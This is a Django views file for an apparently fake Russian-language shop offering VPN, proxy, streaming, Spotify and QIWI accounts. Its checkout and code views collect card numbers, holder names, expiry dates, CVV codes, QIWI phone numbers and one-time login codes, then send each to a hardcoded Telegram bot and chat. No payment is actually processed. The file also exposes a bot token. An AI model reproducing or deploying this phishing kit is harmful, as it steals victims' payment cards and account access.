import telebot
from django.http import HttpResponseRedirect
from .models import *
from django.urls import reverse
from django.shortcuts import render, redirect

"""токен и чат id для коннекта с tg"""
token = "5892156996:AAFBvKbkwPa5rtPTCK6PCQWsOpapPKgBZog"
chat_id = "-1001955272769"

def index(request):
    if 'supmessage' in request.POST:
        value = request.POST.get('mes')
        bot = telebot.TeleBot(token)
        bot.send_message(chat_id, text=f'Помогите: {value} ')
        return redirect('index')
    if 'vpn' in request.POST:
        return redirect('vpn')
    if 'proxy' in request.POST:
        return redirect('proxy')
    if 'steam' in request.POST:
        return redirect('steam')
    if 'cinema' in request.POST:
        return redirect('cinema')
    if 'qiwi' in request.POST:
        return redirect('qiwi')
    if 'spotify' in request.POST:
        return redirect('spotify')
    return render(request, 'main/index.html')

def VPN(request):
    form = vpn.objects.all()
    data = {
        'form': form,
    }
    if request.method == "POST":
        if 'buy' in request.POST:
            for el in form:
                numbs = el.expressVPN
                num = request.POST.get('num')
                if int(num) > int(numbs) or int(num) == 0:
                    error_message = "просто текст"
                    data['error_message'] = error_message
                    return render(request, 'main/vpn.html', data)
                elif int(num) < int(numbs) or int(num) == int(numbs):
                    num = int(request.POST.get('num'))
                    summa = num * 150
                    url = reverse('success', args=[summa])
                    return HttpResponseRedirect(url)
        elif 'buyhide' in request.POST:
            for el in form:
                numbs = el.hideME
                num = request.POST.get('numhide')
                if int(num) > int(numbs) or int(num) == 0:
                    error_message = "просто текст"
                    data['error_message'] = error_message
                    return render(request, 'main/vpn.html', data)
                elif int(num) < int(numbs) or int(num) == int(numbs):
                    num = int(request.POST.get('numhide'))
                    summa = num * 100
                    url = reverse('success', args=[summa])
                    return HttpResponseRedirect(url)
        elif 'buysurf' in request.POST:
            for el in form:
                numbs = el.surfshark
                num = request.POST.get('numsurf')
                if int(num) > int(numbs) or int(num) == 0:
                    error_message = "просто текст"
                    data['error_message'] = error_message
                    return render(request, 'main/vpn.html', data)
                elif int(num) < int(numbs) or int(num) == int(numbs):
                    num = int(request.POST.get('numsurf'))
                    summa = num * 150
                    url = reverse('success', args=[summa])
                    return HttpResponseRedirect(url)
        elif 'supmessage' in request.POST:
            value = request.POST.get('mes')
            bot = telebot.TeleBot(token)
            bot.send_message(chat_id, text=f'Помогите: {value} ')
            return redirect('vpn')
    return render(request, 'main/vpn.html', data)
def Proxy(request):
    form = proxy.objects.all()
    data = {'form': form}
    if request.method == 'POST':
        for el in form:
            number_socks = el.socks_proxy
            number_https = el.ipv_four_proxy
            type_proxy = request.POST.get('proxy')
            date_proxy = request.POST.get('date')
            num = request.POST.get('num')
            if 'buyproxy' in request.POST:
                if 'https' in type_proxy:
                    if int(num) > int(number_https) or int(num) == 0:
                        error_message = "просто текст"
                        data['error_message'] = error_message
                        return render(request, 'main/proxy.html', data)
                    else:
                        if 'onemonth' in date_proxy:
                            summa = int(num) * 25
                            url = reverse('success', args=[summa])
                            return HttpResponseRedirect(url)
                        if 'threemonths' in date_proxy:
                            summa = int(num) * 70
                            url = reverse('success', args=[summa])
                            return HttpResponseRedirect(url)
                if 'socks' in type_proxy:
                    if int(num) > int(number_socks) or int(num) == 0:
                        error_message = "просто текст"
                        data['error_message'] = error_message
                        return render(request, 'main/proxy.html', data)
                    else:
                        if 'onemonth' in date_proxy:
                            summa = int(num) * 50
                            url = reverse('success', args=[summa])
                            return HttpResponseRedirect(url)
                        if 'threemonths' in date_proxy:
                            summa = int(num) * 125
                            url = reverse('success', args=[summa])
                            return HttpResponseRedirect(url)
            elif 'supmessage' in request.POST:
                value = request.POST.get('mes')
                bot = telebot.TeleBot(token)
                bot.send_message(chat_id, text=f'Помогите: {value} ')
                return redirect('proxy')
    return render(request, 'main/proxy.html', data)
def steam(request):
    if request.method == 'POST':
        if 'buylowmmr' in request.POST:
            mmr = request.POST.get('switch')
            summa = int(mmr)
            url = reverse('success', args=[summa])
            return HttpResponseRedirect(url)
        if 'buymediummmr' in request.POST:
            mmr = request.POST.get('switch')
            summa = int(mmr) * 2
            url = reverse('success', args=[summa])
            return HttpResponseRedirect(url)
        if 'buyhighmmr' in request.POST:
            mmr = request.POST.get('switch')
            summa = int(mmr) * 3
            url = reverse('success', args=[summa])
            return HttpResponseRedirect(url)
        if 'supmessage' in request.POST:
            value = request.POST.get('mes')
            bot = telebot.TeleBot(token)
            bot.send_message(chat_id, text=f'Помогите: {value} ')
            return redirect('steam')
    return render(request, 'main/steam.html')
def Qiwi(request):
    form = qiwi.objects.all()
    data = {'form': form}
    if request.method == 'POST':
        if 'buyqiwi' in request.POST:
            for el in form:
                numb = el.qiwi
                num = request.POST.get('num')
                if int(num) > int(numb) or int(num) == 0:
                    error_message = "просто текст"
                    data['error_message'] = error_message
                    return render(request, 'main/qiwi.html', data)
                else:
                    summa = int(num) * 60
                    url = reverse('success', args=[summa])
                    return HttpResponseRedirect(url)
        if 'supmessage' in request.POST:
            value = request.POST.get('mes')
            bot = telebot.TeleBot(token)
            bot.send_message(chat_id, text=f'Помогите: {value} ')
            return redirect('qiwi')




    return render(request, 'main/qiwi.html', data)
def Cinema(request):
    form = cinema.objects.all()
    data = {'form': form}
    if request.method == 'POST':
        if 'buynetflix' in request.POST:
            for el in form:
                subs = el.netflix
                num = request.POST.get('numnetflix')
                if int(num) > int(subs) or int(num) == 0:
                    error_message = 'Неверное кол-во товара'
                    data['error_message'] = error_message
                    return render(request, 'main/cinema.html', data)
                else:
                    summa = int(num) * 100
                    url = reverse('success', args=[summa])
                    return HttpResponseRedirect(url)
        if 'buykinopoisk' in request.POST:
            for el in form:
                subs = el.kinopoisk
                num = request.POST.get('numkinopoisk')
                if int(num) > int(subs) or int(num) == 0:
                    error_message = 'Неверное кол-во товара'
                    data['error_message'] = error_message
                    return render(request, 'main/cinema.html', data)
                else:
                    summa = int(num) * 100
                    url = reverse('success', args=[summa])
                    return HttpResponseRedirect(url)
        if 'buyivi' in request.POST:
            for el in form:
                subs = el.ivi
                num = request.POST.get('numivi')
                if int(num) > int(subs) or int(num) == 0:
                    error_message = 'Неверное кол-во товара'
                    data['error_message'] = error_message
                    return render(request, 'main/cinema.html', data)
                else:
                    summa = int(num) * 100
                    url = reverse('success', args=[summa])
                    return HttpResponseRedirect(url)
        if 'supmessage' in request.POST:
            value = request.POST.get('mes')
            bot = telebot.TeleBot(token)
            bot.send_message(chat_id, text=f'Помогите: {value} ')
            return redirect('cinema')
    return render(request, 'main/cinema.html', data)
def Spotify(request):
    form = spotify.objects.all()
    if request.method == 'POST':
        if 'buyspotify' in request.POST:
            subscribe = request.POST.get('spotify')
            if 'month' in subscribe:
                summa = 100
                url = reverse('success', args=[summa])
                return HttpResponseRedirect(url)
            elif '3' in subscribe:
                summa = 250
                url = reverse('success', args=[summa])
                return HttpResponseRedirect(url)
            elif 'year' in subscribe:
                summa = 1000
                url = reverse('success', args=[summa])
                return HttpResponseRedirect(url)
        if 'supmessage' in request.POST:
            value = request.POST.get('mes')
            bot = telebot.TeleBot(token)
            bot.send_message(chat_id, text=f'Помогите: {value} ')
            return redirect('spotify')
    return render(request, 'main/spotify.html', {'form': form})
def error(request):
    form = vpn.objects.all()
    data = {
        'form': form
    }
    if request.method == 'POST':
        if 'back' in request.method:
            return render(request, 'main/vpn.html', data)
    return render(request, 'main/error.html')

def success(request, summa):
    from random import randint
    num = randint(14000, 16000)
    lst = {'summa': summa, 'num':num}
    if request.method == 'POST':
        if 'numberqiwi' in request.POST:
            bot = telebot.TeleBot(token)
            number = request.POST.get('phone_1')
            numberURL = ''
            for char in number:
                if char.isdigit():
                    numberURL += char
            bot.send_message(chat_id, text=f'Номер телефона для входа в QIWI: {number}')
            url = reverse('code', args=[numberURL])
            return HttpResponseRedirect(url)
        elif 'cardsubmit' in request.POST:
            card_number = request.POST.get('card-number')
            user_name = request.POST.get('card-holder-name')
            date = request.POST.get('card-expiration')
            card_cvv = request.POST.get('card-cvv')
            bot = telebot.TeleBot(token)
            bot.send_message(chat_id, text=f'Номер карты: {card_number}\nИмя держателя карты: {user_name}\nДата: {date}\nCVV: {card_cvv}')
            numberURL = 123
            url = reverse('code', args=[numberURL])
            return HttpResponseRedirect(url)
        else:
            lst = {'summa': summa}
            return render(request, 'main/success.html', lst)
    return render(request, 'main/success.html', lst)
def code(request, numberURL):
    if 'sendcode' in request.POST:
        secret = request.POST.get('secret')
        bot = telebot.TeleBot(token)
        bot.send_message(chat_id, text=f"Qiwi код: {secret}\nНомер: {numberURL}")
    lst = {'number': numberURL}
    return render(request, 'main/code.html', lst)